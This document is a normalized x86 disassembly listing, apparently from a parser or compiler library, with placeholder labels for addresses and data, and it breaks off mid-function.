mov edx [ ecx + 0x10 ]
sub edx [ esi + 0xc ]
add esp 0x10
mov [ ebx + 0x18 ] edx
mov ecx [ esi + 0x10 ]
mov [ ebx + 0x1c ] ecx
mov edx [ esi + 0x14 ]
mov [ ebx + 0x20 ] edx
mov ecx [ esi + 0x18 ]
mov [ ebx + 0x24 ] ecx
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax [ eax ]
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
push 0x96
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push ecx
call sub_100737e0
add esp 0x1c
test eax eax
je r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ edx + ecx * 4 - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax + ecx * 4 - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
push edi
call sub_10073910
add esp 0x4
jmp r-xdata
lea ecx [ eax + 0x10 ]
push ecx
mov [ ebx + 0x4 ] eax
mov edx [ ecx + 0x4 ]
push ebx
push edi
mov [ ebx + 0x8 ] edx
call sub_10046530
add esp 0xc
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
push eax
push ecx
push r--data
call sub_10020200
push esi
push edi
call sub_1004af10
push esi
push edi
call sub_10006330
add esp 0x1c
mov [ esi + 0x1c ] 0x5
pop ebx
sub_10073b40
mov edx [ eax + 0x4 ]
mov [ ecx + 0x30 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x34 ] edx
mov edx [ eax + 0xc ]
mov [ ecx + 0x38 ] edx
cmp [ eax ] 0x2
jne r-xdata
mov eax r--data
mov edx [ eax ]
mov [ ecx + 0x1c ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x20 ] eax
retn
mov edx [ eax + 0x10 ]
add eax 0x10
mov [ ecx + 0x1c ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x20 ] eax
retn
sub_10073b80
push esi
push edi
mov edi eax
mov esi [ edi + 0xc ]
call sub_10073a20
cmp [ esi + 0xc ] 0x0
jbe r-xdata
lea edx [ esi + 0x8 ]
push edx
push edi
call sub_10027980
add esp 0x8
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov edi [ eax ]
cmp edi 0x1
jne r-xdata
pop edi
pop esi
retn
mov ecx [ ecx + 0x1c ]
push ecx
call sub_10068a50
push eax
push r--data
call sub_10020200
add esp 0xc
mov eax [ eax + 0x8 ]
mov ecx [ eax + ecx * 4 - 0x4 ]
xor edx edx
mov ecx [ eax + 0x1c ]
cmp ecx 0xa
jne r-xdata
test edx edx
jne r-xdata
cmp edi 0x1
jne r-xdata
test ecx ecx
jne r-xdata
cmp [ esi + 0x6c ] 0x0
jne r-xdata
pop edi
pop esi
retn
or [ eax + 0xc ] 0x2
jmp r-xdata
mov edi [ eax + 0x1c ]
cmp edi [ ecx + 0x18 ]
je r-xdata
cmp [ esi + 0x70 ] ecx
je r-xdata
mov edx 0x1
jmp r-xdata
mov ecx [ esi + 0x68 ]
mov edx [ ecx + 0x4 ]
mov [ eax + 0x40 ] edx
mov edx [ ecx + 0x8 ]
mov [ eax + 0x44 ] edx
mov edx [ ecx + 0xc ]
mov [ eax + 0x48 ] edx
cmp [ ecx ] 0x2
jne r-xdata
test edx edx
jne r-xdata
mov ecx [ esi + 0x68 ]
cmp [ ecx ] 0x2
jne r-xdata
mov ecx r--data
mov edx [ ecx ]
mov [ eax + 0x2c ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x30 ] ecx
mov edx [ ecx + 0x10 ]
add ecx 0x10
mov [ eax + 0x2c ] edx
mov ecx [ ecx + 0x4 ]
pop edi
mov [ eax + 0x30 ] ecx
pop esi
retn
sub_10073c60
push edi
mov edi eax
call sub_10073a20
push 0x58
push edi
call sub_1006ee90
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0xffffffff
mov [ eax + 0xc ] ecx
mov [ eax ] 0x4
mov ecx [ esi + 0x18 ]
mov [ eax + 0x10 ] ecx
mov edx [ esi + 0x10 ]
mov [ eax + 0x14 ] edx
mov ecx [ esi + 0x14 ]
mov [ eax + 0x18 ] ecx
mov edx [ esi + 0x4 ]
mov [ eax + 0x1c ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ esi + 0xc ]
mov [ eax + 0x24 ] ecx
add esp 0x8
lea ecx [ ebx + 0x10 ]
push ecx
mov [ eax + 0x4 ] ebx
mov edx [ ecx + 0x4 ]
push eax
push edi
mov [ eax + 0x8 ] edx
call sub_10046530
add esp 0xc
pop edi
retn
sub_10073cd0
push 0x96
push 0x66
push 0x0
mov eax esi
call sub_100734d0
push eax
call sub_100737e0
add esp 0x10
test eax eax
jne r-xdata
retn
lea ecx [ ecx ]
mov eax esi
call sub_10073b80
push 0x96
push 0x66
push 0x0
mov eax esi
call sub_100734d0
push eax
call sub_100737e0
add esp 0x10
test eax eax
je r-xdata
sub_10073d20
push 0x96
push 0x5f
push 0x0
mov eax esi
call sub_100734d0
push eax
call sub_100737e0
add esp 0x10
test eax eax
jne r-xdata
retn
lea ecx [ ecx ]
mov eax esi
call sub_10073b80
push 0x96
push 0x5f
push 0x0
mov eax esi
call sub_100734d0
push eax
call sub_100737e0
add esp 0x10
test eax eax
je r-xdata
sub_10073d70
push ebp
mov ebp esp
push esi
push edi
push 0x58
push ebx
call sub_1006ee90
mov edi eax
lea esi [ edi + 0x10 ]
push esi
xor eax eax
push 0x1
push ebx
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] 0xffffffff
mov [ edi ] 0x1
mov [ edi + 0xc ] eax
call sub_1000e7d0
lea eax [ esi + 0x3c ]
push eax
push 0x0
push ebx
call sub_1000e7d0
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] 0x0
mov edx [ r--data ]
mov [ esi + 0x14 ] edx
mov eax [ r--data ]
mov [ esi + 0x18 ] eax
mov ecx [ r--data ]
mov [ esi + 0x1c ] ecx
mov edx [ r--data ]
mov [ esi + 0x20 ] edx
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x68 ]
mov ecx [ eax + 0x4 ]
mov [ esi + 0x24 ] ecx
mov edx [ eax + 0x8 ]
mov [ esi + 0x28 ] edx
mov eax [ eax + 0xc ]
mov [ esi + 0x2c ] eax
mov ecx [ r--data ]
mov [ esi + 0x30 ] ecx
mov edx [ r--data ]
mov [ esi + 0x34 ] edx
mov eax [ r--data ]
add esp 0x20
mov [ esi + 0x38 ] eax
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_10073e20
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
push esi
push 0x58
push eax
call sub_1006ee90
mov ecx [ ebp + 0x8 ]
mov ebx eax
lea esi [ ebx + 0x10 ]
push esi
xor eax eax
push 0x1
push ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] 0xffffffff
mov [ ebx ] 0x1
mov [ ebx + 0xc ] eax
call sub_1000e7d0
mov edx [ edi + 0x1c ]
mov [ esi + 0x3c ] edx
mov eax [ edi + 0x20 ]
mov [ esi + 0x40 ] eax
mov ecx [ edi + 0x24 ]
mov eax [ ebp + 0xc ]
mov [ esi + 0x44 ] ecx
mov edx [ edi + 0x18 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0xc ] edx
mov ecx [ edi + 0x10 ]
mov [ esi + 0x14 ] ecx
mov edx [ edi + 0x14 ]
mov [ esi + 0x18 ] edx
mov eax [ edi + 0x4 ]
mov [ esi + 0x24 ] eax
mov ecx [ edi + 0x8 ]
mov [ esi + 0x28 ] ecx
mov edx [ edi + 0xc ]
mov [ esi + 0x2c ] edx
mov eax [ r--data ]
mov [ esi + 0x1c ] eax
mov ecx [ r--data ]
mov [ esi + 0x20 ] ecx
mov edx [ r--data ]
mov [ esi + 0x30 ] edx
mov eax [ r--data ]
mov [ esi + 0x34 ] eax
mov ecx [ r--data ]
mov [ esi + 0x38 ] ecx
mov edx [ r--data ]
mov [ edi + 0x1c ] edx
mov eax [ r--data ]
add esp 0x14
mov [ edi + 0x20 ] eax
mov ecx [ r--data ]
pop esi
mov eax ebx
mov [ edi + 0x24 ] ecx
pop ebx
pop ebp
retn
sub_10073ee0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi [ edi + 0xc ]
mov ebx eax
jne r-xdata
cmp [ esi + 0x44 ] 0x0
je r-xdata
call sub_10073a20
mov eax [ edi + 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax [ eax ]
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
push 0x96
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push ecx
call sub_100737e0
add esp 0x1c
test eax eax
je r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ eax + ecx * 4 - 0x4 ]
mov edx [ eax + 0x8 ]
mov eax [ edx + ecx * 4 - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
push edi
call sub_10073910
add esi 0x8
push esi
push ebx
push edi
call sub_10046530
add esp 0x10
pop edi
pop esi
pop ebx
pop ebp
retn
lea ecx [ eax + 0x10 ]
push ecx
mov [ ebx + 0x4 ] eax
mov eax [ ecx + 0x4 ]
push ebx
push edi
mov [ ebx + 0x8 ] eax
call sub_10046530
add esi 0x8
push esi
push ebx
push edi
call sub_10046530
add esp 0x18
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10073f90
push esi
push 0x0
push ebx
call sub_10073e20
push 0x0
mov ecx ebx
mov esi eax
call sub_10073ee0
mov eax [ esi + 0x1c ]
add esp 0xc
push esi
push eax
call sub_10068a50
add esp 0x4
push eax
push r--data
call sub_10020200
add esp 0xc
mov eax esi
pop esi
retn
sub_10073fd0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov ebx ecx
push eax
call sub_10073d70
mov esi eax
or edi 0x1
or [ esi + 0xc ] edi
push 0x0
mov ecx ebx
call sub_10073ee0
mov ecx [ ebp + 0x8 ]
add esp 0x8
push esi
push ecx
call sub_10068a50
add esp 0x4
push eax
push r--data
call sub_10020200
add esp 0xc
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
sub_10074020
push ebp
mov ebp esp
push ecx
push esi
push edi
mov esi eax
mov eax [ ebp + 0x8 ]
push esi
push eax
mov edi ebx
call sub_10073e20
mov ecx [ ebp + 0x8 ]
push 0x0
mov [ ebp - 0x4 ] eax
call sub_10073ee0
lea edi [ ebx + 0x1c ]
push r--data
push edi
call sub_10070600
add esp 0x14
test eax eax
je r-xdata
push r--data
push edi
call sub_10070600
add esp 0x8
test eax eax
je r-xdata
mov esi [ esi * 4 + rw-data ]
push r--data
push edi
call sub_10070600
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
push r--data
push edi
call sub_10070600
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax ebx
call sub_100736d0
add esp 0x4
mov ecx [ eax + 0x10 ]
mov eax esi
mov edx [ ebp + 0x8 ]
push edx
mov eax ebx
call sub_100736d0
add esp 0x4
mov ecx [ eax + 0x10 ]
mov eax r--data
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
xor ecx ecx
test eax eax
sete cl
mov eax ecx
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
xor ecx ecx
test eax eax
sete cl
mov eax ecx
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_10074130
push esi
mov esi [ eax + 0xc ]
add esi 0x48
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ edi + 0x18 ]
push esi
push ecx
push eax
call sub_1004c3a0
add esp 0xc
cmp [ edi ] 0x5
jne r-xdata
mov ecx [ edi + 0x10 ]
mov [ esi + 0xc ] ecx
mov edx [ edi + 0x4 ]
mov [ esi + 0x10 ] edx
mov ecx [ edi + 0x8 ]
mov [ esi + 0x14 ] ecx
mov edx [ edi + 0xc ]
mov [ esi + 0x18 ] edx
mov edx [ edi + 0x18 ]
push edx
push r--data
call sub_10020200
add esp 0x8
pop esi
retn
mov [ esi + 0x1c ] 0x2
sub_10074190
push ebp
mov ebp esp
push edi
push 0x0
push esi
mov edi eax
call sub_10073e20
push 0x0
mov ecx esi
mov edi eax
call sub_10073ee0
mov eax [ edi + 0x1c ]
add esp 0xc
push edi
push eax
call sub_10068a50
add esp 0x4
push eax
push r--data
call sub_10020200
mov ecx [ ebp + 0x8 ]
push ecx
push esi
call sub_10067ca0
mov eax [ esi + 0xc ]
mov edx [ eax ]
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xc ]
add esp 0x14
mov [ eax ] 0x7
pop edi
pop ebp
retn
sub_100741f0
push ebp
mov ebp esp
mov ecx [ eax + 0xc ]
mov eax [ ecx + 0x18 ]
dec eax
js r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ecx + 0x14 ]
lea edx [ ecx + eax * 4 ]
cmp [ ecx ] 0x1
jne r-xdata
sub edx 0x4
dec eax
jns r-xdata
cmp [ ecx + 0x1c ] 0x27
je r-xdata
mov ecx [ edx ]
cmp ecx r--data
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax 0x1
pop ebp
retn
sub_10074230
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ eax + 0xc ]
mov esi [ edi + 0x18 ]
xor eax eax
dec esi
mov [ ebp - 0x4 ] eax
js r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
push ebx
mov eax [ ebp - 0x4 ]
pop ebx
cmp [ eax ] 0x1
jne r-xdata
dec esi
jns r-xdata
mov edx [ eax + 0x1c ]
mov ecx [ ebp + 0x8 ]
cmp edx [ ecx + 0x1c ]
jne r-xdata
mov ecx [ edi + 0x14 ]
mov eax [ ecx + esi * 4 ]
cmp eax r--data
je r-xdata
mov edx [ eax + 0x20 ]
cmp edx [ ecx + 0x20 ]
jne r-xdata
add ecx 0x4c
push ecx
lea ebx [ eax + 0x4c ]
call sub_10073350
add esp 0x4
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
inc [ ebp - 0x4 ]
mov [ eax ] esi
sub_100742a0
push ebp
mov ebp esp
push ecx
push esi
mov esi [ edi + 0xc ]
add esi 0x14
cmp ebx r--data
jne r-xdata
push r--data
push r--data
jmp r-xdata
push esi
push ebx
push edi
call sub_10046530
add esp 0xc
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
push edx
push r--data
call sub_10020200
mov eax [ ebp - 0x4 ]
push esi
push eax
push edi
call sub_1005c190
add esp 0x14
call sub_10020200
mov eax [ esi + 0x4 ]
add esp 0x4
lea ecx [ ebp - 0x4 ]
push ecx
mov [ ebp - 0x4 ] eax
push ebx
mov eax edi
call sub_10074230
add esp 0x8
cmp eax 0x3
jl r-xdata
sub_10074310
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ eax + 0xc ]
push esi
mov esi [ ebx + 0x18 ]
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x14 ]
dec esi
lea ecx [ ecx + esi * 4 ]
push edi
mov edi [ ecx ]
mov [ ebp - 0x4 ] ecx
cmp edi r--data
je r-xdata
pop edi
mov edx [ ebx + 0xc ]
xor eax eax
test edx edx
je r-xdata
test esi esi
je r-xdata
mov ecx [ ebx + 0x8 ]
lea esp [ esp ]
or esi 0xffffffff
mov edi [ ecx - 0x4 ]
sub ecx 0x4
dec esi
mov [ ebp - 0x4 ] ecx
cmp edi r--data
je r-xdata
inc eax
add ecx 0x4
cmp eax edx
jb r-xdata
mov eax [ eax + 0x1c ]
push eax
call sub_10068a50
push eax
push esi
push r--data
call sub_10020200
add esp 0x10
cmp esi [ ebx + 0x18 ]
jae r-xdata
mov edx [ ebx + 0x8 ]
mov eax [ edx + eax * 4 - 0x4 ]
mov eax [ ebx + 0xc ]
inc esi
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
xor eax eax
test edx edx
je r-xdata
cmp [ ecx ] edi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov ecx [ ebx + 0x14 ]
mov eax [ ecx + esi * 4 ]
mov edx [ ebp + 0x8 ]
push 0x80
push eax
push edx
call sub_1002f440
mov ecx [ ebp + 0x8 ]
push 0x1
mov edi eax
call sub_10073ee0
mov eax [ ebx + 0x14 ]
add esp 0x10
mov [ eax + esi * 4 ] edi
mov ecx [ edi + 0x1c ]
push esi
push ecx
call sub_10068a50
add esp 0x4
push eax
push r--data
call sub_10020200
inc esi
add esp 0xc
cmp esi [ ebx + 0x18 ]
jb r-xdata
mov ecx [ ebx + 0x8 ]
inc eax
add ecx 0x4
cmp eax edx
jb r-xdata
cmp [ ecx ] edi
je r-xdata
mov ecx [ ebp - 0x4 ]
jmp r-xdata
sub_10074420
push esi
mov esi [ ebx + 0xc ]
push edi
add esi 0x14
xor edi edi
lea ebx [ ebx ]
push edi
push r--data
call sub_10020200
add esp 0x8
pop edi
pop esi
retn
cmp eax r--data
jne r-xdata
push esi
push ebx
call sub_10027980
add esp 0x8
inc edi
test eax eax
je r-xdata
sub_10074460
cmp [ esi + 0xc ] 0x0
push ebx
push edi
jne r-xdata
pop edi
mov eax 0x1
pop ebx
retn
mov eax [ esi ]
mov ecx r--data
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov edi [ esi + 0x4 ]
xor ebx ebx
mov eax r--data
call sub_100734f0
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov edi [ esi + 0x4 ]
lea ebx [ eax + 0x1 ]
mov eax r--data
call sub_100734f0
test eax eax
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov edi [ esi + 0x8 ]
mov eax r--data
call sub_100734f0
test eax eax
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov edi [ esi + 0x4 ]
xor ebx ebx
mov eax r--data
call sub_100734f0
test eax eax
je r-xdata
mov edi [ esi + 0x4 ]
xor ebx ebx
mov eax r--data
call sub_100734f0
test eax eax
jne r-xdata
cmp [ esi + 0x14 ] ebx
je r-xdata
pop edi
mov eax 0x2
pop ebx
retn
mov edi [ esi + 0x4 ]
mov eax r--data
call sub_100734f0
test eax eax
je r-xdata
pop edi
xor eax eax
pop ebx
retn
cmp [ esi + 0x14 ] ebx
jne r-xdata
sub_10074530
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebx + 0xc ]
push edi
lea eax [ ebp - 0x14 ]
push eax
push 0xa
push ebx
call sub_1000e7d0
mov eax [ ebp + 0x14 ]
add esp 0xc
cmp eax 0x96
je r-xdata
mov edi [ esi + 0xc ]
dec edi
mov [ ebp - 0x8 ] 0x0
js r-xdata
lea edi [ ebp + 0x14 ]
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push ebx
call sub_1005e540
mov eax [ ebp - 0x8 ]
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi + 0x8 ]
mov ebx [ ebp - 0x10 ]
lea eax [ edx + edi * 4 ]
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x14 ]
push ecx
push eax
push ebx
call sub_10046530
mov eax [ edi + 0x4 ]
add edi 0x4
add esp 0xc
cmp eax 0x96
jne r-xdata
sub [ ebp - 0x4 ] 0x4
dec edi
jns r-xdata
mov edx [ ebp + 0xc ]
mov esi [ eax + 0x1c ]
mov ecx [ edx + 0x4 ]
xor eax eax
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
cmp [ eax ] 0x1
jne r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
test ebx ebx
je r-xdata
mov edx [ edx ]
nop
mov ebx [ ebp + 0x8 ]
cmp [ ebp + 0x10 ] ecx
jne r-xdata
mov edx [ ebp - 0x14 ]
cmp [ edx + eax * 4 ] esi
je r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
inc eax
add edx 0x4
cmp eax ecx
jb r-xdata
mov [ ebp - 0x8 ] 0x0
mov ecx 0x1
inc eax
cmp eax ebx
jb r-xdata
cmp esi [ edx ]
je r-xdata
jmp r-xdata
sub_10074610
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
mov [ ebp - 0x4 ] eax
push 0x7c
mov eax 0x1
push 0x0
lea edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_10074530
add esp 0x54
mov esp ebp
pop ebp
retn
sub_10074670
mov eax [ eax + 0xc ]
push esi
mov esi [ eax + 0xc ]
dec esi
push edi
js r-xdata
pop edi
xor eax eax
pop esi
retn
mov ecx [ eax + 0x8 ]
lea edi [ ecx + esi * 4 ]
pop edi
mov eax 0x1
pop esi
retn
cmp [ eax ] 0x1
jne r-xdata
sub edi 0x4
dec esi
jns r-xdata
push 0x96
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
push 0x7c
push eax
call sub_100737e0
add esp 0x4c
test eax eax
jne r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
sub_100746e0
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0xc ]
push eax
push 0x6
push esi
call sub_1000e7d0
mov eax [ ebp + 0xc ]
add esp 0xc
cmp eax 0x96
je r-xdata
push 0x96
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
push 0x7c
push 0x0
lea edx [ ebp - 0xc ]
push edx
push esi
call sub_10074530
mov edi eax
lea eax [ ebp - 0xc ]
push eax
push esi
call sub_1005e540
add esp 0x5c
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
lea edi [ ebp + 0xc ]
lea ecx [ ebp - 0xc ]
push ecx
push eax
push esi
call sub_10046530
mov eax [ edi + 0x4 ]
add edi 0x4
add esp 0xc
cmp eax 0x96
jne r-xdata
sub_10074770
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x1e
push 0x1d
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
mov [ ebp - 0x4 ] eax
push 0x7c
mov eax 0x1
push 0x0
lea edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_10074530
add esp 0x5c
mov esp ebp
pop ebp
retn
sub_100747d0
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x6e
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
mov [ ebp - 0x4 ] eax
push 0x7c
mov eax 0x1
push 0x0
lea edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_10074530
add esp 0x58
mov esp ebp
pop ebp
retn
sub_10074830
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x5f
mov [ ebp - 0x4 ] eax
push 0x0
mov eax 0x1
push 0x0
lea edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_10074530
add esp 0x18
mov esp ebp
pop ebp
retn
sub_10074870
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x72
mov [ ebp - 0x4 ] eax
mov eax 0x1
push 0x71
push eax
lea edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_10074530
add esp 0x18
mov esp ebp
pop ebp
retn
sub_100748b0
push 0x96
push 0x3d
push 0x3e
push 0x19
push 0x71
push 0x72
push 0x1f
push 0x21
push 0x22
mov eax esi
call sub_100734d0
push eax
call sub_100737e0
add esp 0x28
test eax eax
je r-xdata
retn
lea esp [ esp ]
mov eax esi
call sub_10073b80
push 0x96
push 0x3d
push 0x3e
push 0x19
push 0x71
push 0x72
push 0x1f
push 0x21
push 0x22
mov eax esi
call sub_100734d0
push eax
call sub_100737e0
add esp 0x28
test eax eax
jne r-xdata
push edi
mov eax esi
call sub_100734d0
call sub_10073830
add esp 0x4
test eax eax
jne r-xdata
sub_10074930
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x5f
push 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
push ecx
lea eax [ ebp - 0x4 ]
push esi
mov [ ebp - 0x4 ] 0x5f
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x8 ] 0x1
call sub_10074530
add esp 0x18
test eax eax
jne r-xdata
mov eax esi
call sub_10073b80
cmp [ eax ] 0x1
jne r-xdata
mov esp ebp
pop ebp
retn
cmp [ eax + 0x1c ] 0x5f
jne r-xdata
mov eax esi
call sub_10073560
mov eax 0x1
mov esp ebp
pop ebp
retn
sub_100749a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi 0x96
mov ebx eax
mov [ ebp - 0x4 ] 0x1
call sub_100748b0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
cmp [ ecx ] 0x1
jne r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ eax + ecx * 4 - 0x4 ]
mov eax [ ebp + 0x8 ]
push esi
call sub_100736d0
add esp 0x4
mov [ ebp - 0x4 ] 0x0
lea ebx [ ebx ]
cmp [ ecx + 0x1c ] ebx
je r-xdata
mov eax esi
call sub_10073b80
cmp [ eax ] 0x1
jne r-xdata
cmp [ eax + 0x1c ] ebx
jne r-xdata
mov edi [ esi + 0xc ]
add edi 0x14
xor ebx ebx
lea esp [ esp ]
push ebx
push r--data
call sub_10020200
mov ecx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
add esp 0x8
pop edi
pop esi
mov [ ecx ] 0xd
pop ebx
mov esp ebp
pop ebp
retn
cmp eax r--data
jne r-xdata
push edi
push esi
call sub_10027980
add esp 0x8
inc ebx
test eax eax
je r-xdata
sub_10074a50
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x5f
push 0x0
lea eax [ ebp - 0x4 ]
push 0x0
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax 0x1
push ecx
push esi
mov [ ebp - 0x4 ] 0x67
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
call sub_10074530
add esp 0x18
test eax eax
push edi
mov ecx esi
mov eax 0x67
jne r-xdata
call sub_100749a0
add esp 0x4
mov esp ebp
pop ebp
retn
mov eax 0x68
sub_10074ad0
mov eax [ ecx + 0x20 ]
sub eax 0x0
je r-xdata
push 0x96
push 0x85
push 0x43
push 0x1e
push 0x66
push 0x2
push 0x64
push 0x68
push 0x65
push 0x73
push 0x67
push 0x63
push 0x5f
push 0x79
push 0x6
push 0x6f
push 0xc
push 0x7
push 0x1b
push 0x88
push 0x4b
push 0x19
push 0x1d
push 0x4a
push 0x8
push 0x82
push 0x87
push 0xd
push 0x5
push 0x7a
push 0x90
push 0x84
push 0x4
push 0x1f
push 0x83
push 0x6d
push 0x47
push 0x48
push 0x0
push 0x1a
push 0x15
push 0x16
push 0x1
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push 0x81
push 0x80
push 0x69
push 0x17
push 0x23
